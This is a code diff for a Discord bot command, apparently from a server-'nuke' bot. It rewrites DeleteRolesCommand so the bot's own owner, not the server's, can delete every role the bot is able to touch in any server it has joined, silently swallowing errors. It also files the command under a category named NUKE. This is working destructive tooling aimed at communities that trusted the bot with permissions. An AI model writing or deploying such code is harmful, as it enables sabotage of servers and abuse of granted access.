@@ -18,23 +18,15 @@ public class DeleteRolesCommand implements ICommand {
         if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
             return;
         }
-        List<Role> roles = event.getGuild().getRoles();
-        int roleSize = roles.size();
-            try {
-                for (int i = 0; i <= roleSize ; i++) {
-                    try {
-                        roles.get(i).delete().queue();
-                    } catch (HierarchyException | UnsupportedOperationException ex1) {
-//                        event.getChannel().sendMessage(" cannot delete roles higher than mine (skipping)").queue();
-                    }
-                }
-            } catch(HierarchyException | UnsupportedOperationException | ErrorResponseException | ArrayIndexOutOfBoundsException ex) {
-//                event.getChannel().sendMessage(" cannot delete roles higher than mine (skipping)").queue();
+        for (Role role : event.getGuild().getRoles())
+        {
+            if (event.getGuild().getSelfMember().canInteract(role)) {
+                try {
+                    role.delete().queue();
+                } catch (Exception ex) {}
             }
+        }
         event.getMessage().delete().queue();
-//            List<Message> messages = event.getChannel().getHistory().retrievePast(2).queue();
-//            event.getChannel().deleteMessages(messages).queue();
-//            event.getChannel().sendMessage("Deleted roles").queue();
     }
 
     @Override
@@ -50,6 +42,11 @@ public class DeleteRolesCommand implements ICommand {
     @Override
     public String[] getAlias() {
         return new String[] {"deleteroles","rolesdelete"};
+    }
+
+     @Override
+    public Category getCategory() {
+        return Category.NUKE;
     }
     
     
